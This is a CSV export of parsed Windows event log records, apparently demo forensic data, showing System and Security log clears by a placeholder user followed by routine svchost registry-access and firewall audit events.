RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
1,27736,2019-03-19 23:34:25.8943413,104,Info,Microsoft-Windows-Eventlog,System,812,3916,PC01.example.corp,0,S-1-5-21-1587066498-1489273250-1035260531-1106,Event log cleared,EXAMPLE\user01,,The System log file was cleared,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_104_system_log_cleared.evtx,Classic,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserName"":""user01"",""SubjectDomainName"":""EXAMPLE"",""Channel"":""System"",""BackupPath"":""""}}}"
1,452811,2019-03-19 23:35:07.5242021,1102,Info,Microsoft-Windows-Eventlog,Security,812,3916,PC01.example.corp,0,,Event log cleared,EXAMPLE\user01,,SID: (S-1-5-21-1587066498-1489273250-1035260531-1106),,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-1587066498-1489273250-1035260531-1106"",""SubjectUserName"":""user01"",""SubjectDomainName"":""EXAMPLE"",""SubjectLogonId"":""0x17DAD""}}}"
2,452812,2019-03-19 23:35:08.7860165,5156,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,The Windows Filtering Platform has allowed a connection,,,Source: fe80::80ac:4126:fa58:1b81:546,Dest: ff02::1:2:547,Protocol: User Datagram Protocol (UDP),PID: 812,Direction: Outbound,LayerName: Connect,\device\harddiskvolume1\windows\system32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""ProcessID"",""#text"":""812""},{""@Name"":""Application"",""#text"":""\\device\\harddiskvolume1\\windows\\system32\\svchost.exe""},{""@Name"":""Direction"",""#text"":""%%14593""},{""@Name"":""SourceAddress"",""#text"":""fe80::80ac:4126:fa58:1b81""},{""@Name"":""SourcePort"",""#text"":""546""},{""@Name"":""DestAddress"",""#text"":""ff02::1:2""},{""@Name"":""DestPort"",""#text"":""547""},{""@Name"":""Protocol"",""#text"":""17""},{""@Name"":""FilterRTID"",""#text"":""65853""},{""@Name"":""LayerName"",""#text"":""%%14611""},{""@Name"":""LayerRTID"",""#text"":""50""},{""@Name"":""RemoteUserID"",""#text"":""S-1-0-0""},{""@Name"":""RemoteMachineID"",""#text"":""S-1-0-0""}]}}"
3,452813,2019-03-19 23:35:14.6344261,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
4,452814,2019-03-19 23:35:14.6344261,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
5,452815,2019-03-19 23:35:14.7646133,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
6,452816,2019-03-19 23:35:14.7646133,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
7,452817,2019-03-19 23:35:14.9048149,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
8,452818,2019-03-19 23:35:14.9048149,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
9,452819,2019-03-19 23:35:15.0450165,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
10,452820,2019-03-19 23:35:15.0450165,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
11,452821,2019-03-19 23:35:15.1852181,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
12,452822,2019-03-19 23:35:15.1852181,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
13,452823,2019-03-19 23:35:15.2052469,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
14,452824,2019-03-19 23:35:15.2152613,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
15,452825,2019-03-19 23:35:15.2152613,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
16,452826,2019-03-19 23:35:15.2152613,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
17,452827,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
18,452828,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
19,452829,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
20,452830,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
